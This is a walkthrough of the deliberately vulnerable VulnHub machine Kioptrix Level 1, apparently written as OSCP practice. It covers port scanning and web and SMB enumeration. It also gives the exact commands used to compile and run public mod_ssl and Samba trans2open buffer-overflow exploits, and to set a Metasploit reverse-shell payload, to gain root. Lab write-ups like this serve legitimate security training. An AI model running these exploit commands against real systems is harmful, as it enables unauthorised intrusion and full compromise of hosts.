# Kioptrix: Level 1 (#1)
[VulnHub link](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)  
By Kioptrix

## Setting Up the Box ##
* Initially faced issues when I was following [this article](https://techathlon.com/how-to-run-a-vmdk-file-in-oracle-virtualbox/) to run a .vmdk file in VirtualBox. Based on past VulnHub boxes so far, newer machines give a .ova/.ovf file from the Downloads, and allows us to load the box without configuring much by ourselves.
* Fortunately, [this article](https://www.hypn.za.net/blog/2017/07/15/running-kioptrix-level-1-and-others-in-virtualbox/) tells us exactly what we need to do to load the box successfully. While the above link is accurate is describing to us how we can load it into VirtualBox, I encountered the `kernel panic` error while starting it up.

## Enumeration ##
* We are first greeted with a login page that requires users to specify a set of credentials:
![](/screenshots/kioptrix-level-1/loginInitial.jpg)
* Run `nmap -T5 10.0.2.*`, where we find `10.0.2.12` to be the IP address of the vulnerable machine. 6 services were also discovered, where they are all in an Open state.
![](/screenshots/kioptrix-level-1/nmapScan.jpg)
* Note: This screenshot was updated during a re-visit of the machine.
* Run `nmap -sC -sV -T5 -p- 10.0.2.12` to enumerate the running services:
![](/screenshots/kioptrix-level-1/hostFullScan.jpg)
* Note: This screenshot was updated during a re-visit of the machine.
* As this machine is relatively much older than all of the challenges we had done so far, we are seeing the versions of the services running being much older (and thus I am also guessing that it will be easier to find exploits specific to these versions?).
* Let us start with the Apache httpd service at port 80.

## Apache httpd service at Port 80 ##
* We see a test page after loading `http://10.0.2.12/` on our browser, which appears to be the default page that would indicate a successful installation.
![](/screenshots/kioptrix-level-1/httpHomePage.jpg)
* No `robots.txt` file was found.
* `gobuster dir -u http://10.0.2.12 -w /usr/share/wordlists/dirb/common.txt` completed in no time, and we found a couple of pages that would result in a redirect upon accessing them. (Running the same command and adding the search for .html pages did not yield new results.)
![](/screenshots/kioptrix-level-1/httpGobusterDirScan.jpg)
* Loading `http://10.0.2.12/manual` redirects us to `http://127.0.0.1/manual/`. This was the same for `/mrtg` and `/usage`.
* Requesting for `/manual` through Burp Suite confirms that it is a simple redirect with no other information revealed, and following the redirect leads to a GET request with the domain changed to localhost:
![](/screenshots/kioptrix-level-1/httpPageRedirect.jpg)
* The nmap scan showed that the `TRACE` method was present, thus I ran `OPTIONS` to see what othe methods were allowed:
![](/screenshots/kioptrix-level-1/httpOptionsMethod.jpg)
* Next, I ran the `TRACE` method:
![](/screenshots/kioptrix-level-1/httpTraceMethod.jpg)

## Apache service at Port 443 ##
* Next, I decided to search for version-specific (`Apache 1.3.20`) exploits, and found `Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)` as the very first result. The Exploit-DB link is found [here](https://www.exploit-db.com/exploits/764). This would involve the `ssl/https` service instead of the `http` service.
![](/screenshots/kioptrix-level-1/apacheGoogleExploit.jpg)
* The exploit had almost 1,300 lines of code. Compiling the code with gcc led me to a `fatal error: openssl/ssl.h: No such file or directory during gcc` error. I installed the library afterwards with `sudo apt-get install libssl-dev`.
* However, more errors popped up (even after I correctly compiled with `-lcrypto` now) and I was led to [this page](https://www.hypn.za.net/blog/2017/08/27/compiling-exploit-764-c-in-2017/) by Google, which does an excellent job in telling us to edit specific parts of the code to get the exploit compilable. [Another article](https://www.sevenlayers.com/index.php/100-mod-ssl-remote-buffer-overflow) did a great job in pointing out the exact lines of old code that needed to be changed.
* I have uploaded the working code (`764.c`)that I have (after making the suggested edits) onto the same directory as my screenshots for this walkthrough.
* Note: Be careful when copying the comamnds from the page into the exploit code, particularly when it comes to those involving inverted commas. You might see errors relating to them only after all edits are made if you missed it out.
* I used Notepad++ to edit the exploit code first before transferring it to my Kali machine. Alternatively, using Vim and its commands to jump to specific lines of code is helpful too.
* **Re-visit**: I had apparently missed the very first line of the exploit code previously, which gave a link to the updated exploit. The newer version [found here](https://www.exploit-db.com/exploits/47080) (on Exploit-DB too) does not require any edits to it, and can be compiled successfully after downloading with `gcc 47080.c -lcrypto`. Running the same `./a.out` command with the correct command-line arguments give us the same `root` shell as well.
* **Note-to-self**: Remember to read the first few lines of the code to be clearer about its background, especially since the version of the exploit that we found ends with a `(1)`, which meant that there should be more than one versions and should have a `(2)`.
* Running `./a.out` (or whatever your file name is) tells us that we need to insert 4 command-line arguments. The one that I had trouble with initially was the box number argument. There is a long list of box options available to choose from, and the only information we had (from the nmap scan) was `Red Hat` and `Apache 1.3.20`.
* Since we did not have the Red Hat version number (did not know of other ways to find out, the landing home page did not reveal did, nor was there a README page), I searched amongst the results using the number that we had:
![](/screenshots/kioptrix-level-1/openFExploitBoxOptions.jpg)
* After narrowing it down to 2 box options, trying the first one with `./a.out 0x6a 10.0.2.12 443 -c 40` resulted in the program terminating really quickly:
![](/screenshots/kioptrix-level-1/openFExploitWrongBoxOption.jpg)
* It said spawning shell and then suddenly the next thing was a good-bye. I thought I had done something wrongly (or missed out on instructions of some sort and went to re-read the exploit code and search for answers). What I really should have done is quickly try out the next box option.
* Using the correct box option `0x6b`, during the first successful run of the exploit, I encountered the message `Now wait for the suid shell...`. I thought that there would be something popping up afterwards (only did I realise later that the (root) shell had already been successfully spawned - silly me).
![](/screenshots/kioptrix-level-1/openFExploitFirstSuccessRun.jpg)
* I re-ran the exploit and found the last few lines of output to be different (and even less of an indicator that we had a shell now:
![](/screenshots/kioptrix-level-1/openFExploitSecondSuccessRun.jpg)

## SSH Service at Port 22 ##
* After successfully getting a shell through the HTTPS service, I was trying to find version-specific (relating to `OpenSSH 2.9p2`) exploits for the SSH service.
* I tried one: `OpenSSH 2.x/3.x - Kerberos 4 TGT/AFS Token Buffer Overflow`, based on the [Exploit-DB entry](https://www.exploit-db.com/exploits/21402). After downloading the tar file and unzipping it, I encountered errors (that I did not know how to resolve) when trying to run `make`.
* The above exploit was one of those that abatchy tried (but did not find working in this machine's instance), as seen in [his blog post on the same vulnerable machine](https://www.abatchy.com/2016/11/kioptrix-1-walkthrough-vulnhub).

## Samba Smbd Service at Port 139 ##
### Enumerating Service Information ###
* Running `enum4linux 10.0.2.12` quickly gave us a long list of results. We see `KIOPTRIX Wk Sv PrQ Unx NT SNT Samba Server` under the `OS Information` section, with OS version `4.5` running.
![](/screenshots/kioptrix-level-1/enum4linuxOsInformation.jpg)
* **Re-visit**: I read from kongwenbin's write-up that running the command should give us the OS information for the smbclient as well. Notice that ours is left blank as shown above. Crucially, it reveals that the Samba version is `2.2.1a`, and not 4.5 as what we thought!
* After re-searching on this issue, I found out that it has been an unresolved one, with an [issue open on the enum4linux GitHub repository](https://github.com/portcullislabs/enum4linux/issues/5), and a [closed issue in Kali Bug Tracker](https://bugs.kali.org/view.php?id=4495), whose solution I did not attempt because it did not feel right. There is [a post on the OSCP forums](https://forums.offensive-security.com/showthread.php?22241) about this - with several options to replace the particular malfunction feature of enum4linux (or even the tool itself altogether):
1. Use a Metasploit module (found [here](https://www.offensive-security.com/metasploit-unleashed/scanner-smb-auxiliary-modules/)) - `msfconsole`, `use auxiliary/scanner/smb/smb_version`, `set RHOSTS 10.0.2.12` and finally `run`:
![](/screenshots/kioptrix-level-1/metasploitModuleSmbVersion.jpg)
* **Question**: I am not too sure why it says `Host could not be identified`, although the output was correct and instantaneous.
2. Use a [bash script](https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html)
3. Use a [dedicated Python script](https://github.com/amitn322/smb-version) just for getting the version of Samba server
4. Use a [ported Python-equivalent script](https://github.com/0v3rride/Enum4LinuxPy) (that was ported over from the original Perl version)

### 2 Avenues to Obtain Root Shell Through BoF Vulnerability ###
* According to [a cvedetails page for a vulnerability associated with Samba 2.2.1a](https://www.cvedetails.com/cve/CVE-2003-0201/), the name of the exploit is due to a "buffer overflow in the call_trans2open function in trans2.c". Accoding to the [SecurityFocus's entry page on this vulnerability](https://www.securityfocus.com/bid/7294/discuss) "The problem occurs when copying user-supplied data into a static buffer. By passing excessive data to an affected Samba server, it may be possible for an anonymous user to corrupt sensitive locations in memory. Successful exploitation of this issue could allow an attacker to execute arbitrary commands, with the privileges of the Samba process."
* There are 2 general avenues to get a `root` shell in this section, one through a Metasploit module, and the other through non-Metasploit methods. There are multiple POCs available for the latter, especially as seen in the [exploit's section of the remote buffer overflow vulnerability that is used](https://www.securityfocus.com/bid/7294/exploit).
* Note: Those links listed in the page no longer work (for me at least).
* Note-to-self: When in doubt if POCs are using the same vulnerability, use the CVE listed as one of the ways to determine. I was confused initially because of the naming of the exploit that made me mistake that there were more than 1 vulnerability here that could get us a `root` shell.

### trans2open Overflow (Non-Metasploit) ###
* Our [first Google search result](https://www.exploit-db.com/exploits/10) (which is from Exploit-DB) for `samba 2.2.1a exploit` was able to give us a `root` shell easily - through `Remote Code Execution`:
![](/screenshots/kioptrix-level-1/sambaExploitGoogleSearch.jpg)
* After downloading and compiling the code (`gcc 10.c`), run `./a.out -b 0 10.0.2.12`:
![](/screenshots/kioptrix-level-1/sambaRemoteRootExploit.jpg)
* Note: The `-b` parameter indicates the platform: `0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2`. Choosing any of the numbers except 3 would result in a `root` shell.
* Note: Running `exit` seems to be a little buggy for me, i.e. the shell does not terminate immediately.
* **Question**: The [second Google search](https://www.exploit-db.com/exploits/7) result (which is also from Exploit-DB) is a Perl script that does not result in any shell (and which also seems to run indefinitely - I killed it after around 10 minutes). I ran the command: `perl 7.pl -t linx86 -H 10.0.2.6 -h 10.0.2.12`.

### trans2open Overflow (Metasploit) ###
* [A Rapid7 entry](https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open) shows that there is a Metasploit module available pertaining to it for our use.
* Searching with the keyword `trans2open` after running `msfconsole` gives us 4 results, with each being applicable to only the respective OSes. We will select the `Linux x86` one, based on our information obtained earlier from enumeration using a Metasploit auxiliary module.
![](/screenshots/kioptrix-level-1/metasploitTrans2openModules.jpg)
* Alternatively, instead of searching, we can directly use the information given in the Rapid7 page: `use exploit/linux/samba/trans2open`.
* `options` tells us that we need to `set RHOSTS 10.0.2.12`. Running `exploit` immediately afterwards results in many meterpreter sessions being open and 'dying' instantly. `options` shows us that our default payload used was `linux/x86/meterpreter/reverse_tcp`:
![](/screenshots/kioptrix-level-1/metasploitMeterpreterSessionsDying.jpg)
* Changing the payload would solve the issue: `set payload generic/shell_reverse_tcp`. Run `exploit` next to get a `root` shell:
![](/screenshots/kioptrix-level-1/metasploitReverseShell.jpg)

### Other Attempts for Samba Service ###
* The Share Enumeration results from `enum4linux` was also noted, where there are errors encountered when trying to "map shares". There was also a list of results for users and groups.
* Running `smbmap -H 10.0.2.12` shows a single line of output, `[+] Finding open SMB ports....`, before the program terminates. Judging this against from what we see in `lazysysadmin`, the Kioptrix has only got one port (on 139) with the `netbios-ssn` service, as compared to the latter which has 2 ports (on 139 and 445), which probably explains the non-discovery of open SMB ports in this instance (I think).
* Accessing `smb://10.0.2.12/` using the Kali Linux file explorer shows nothing. I had expected `IPC$` and `ADMIN$` to be showing up at least, as seen on `lazysysadmin`. However, in hindsight, since they were not found using `smbmap`, that could be the reason why we are not seeing them this way as well.
![](/screenshots/kioptrix-level-1/smbFolderNoFinding.jpg)
* I was also thinking that the error when trying to map shares during the `enum4linux` scan explains why the latter 2 commands failed.
* At this point, I wasn't quite sure what else to make of the results from above, especially the output from `enum4linux`, since I was trying out to make a headway based on the limited experience from encountering this service in 2 previous machines - `lazysysadmin` and `stapler`. The exploit used in the latter machine would not work here because we do not have a writeable SMB share (I could not even find a readable one).
* **Re-visit**: Tried an `anonymous` login to IPC$ share using `smbclient //10.0.2.12/IPC$ -N`, and was successful. However, I could not list or write any items in the current working directory.
![](/screenshots/kioptrix-level-1/smbclientAttempt.jpg)

# Concluding Remarks
2 hints obtained on the way to getting a root shell (in some way):
1. When I was searching for version-specific exploits for the HTTP(S) service, I kept seeing "Kioptrix" popping up, and sort of knew that I might be on the correct path.
2. I did not manage to get the box option right on the first go and found that the solution was simply choosing the other box option while trying to debug the issue.

I wanted to work on this box as one of the first few boxes to start my journey towards OSCP, but encountered errors in setting up the box back then, and I could not manage to fix them. On my second day of journey into PWK, I was poking around at the labs and found Kioptrix coming up on multiple instances during my Google searches and decided that I needed to get down to trying them out no matter what.

1. Learnt how to modify old exploit codes (with step-by-step assistance from others who have gone before me)
2. Learnt of the need to try out obvious options first before possibly having to go deeper to dig for answers (where the latter was unnecessary here).

# Other Walkthrough References
1. https://kongwenbin.wordpress.com/2016/10/25/writeup-for-kioptrix-level-1/
2. https://www.abatchy.com/2016/11/kioptrix-1-walkthrough-vulnhub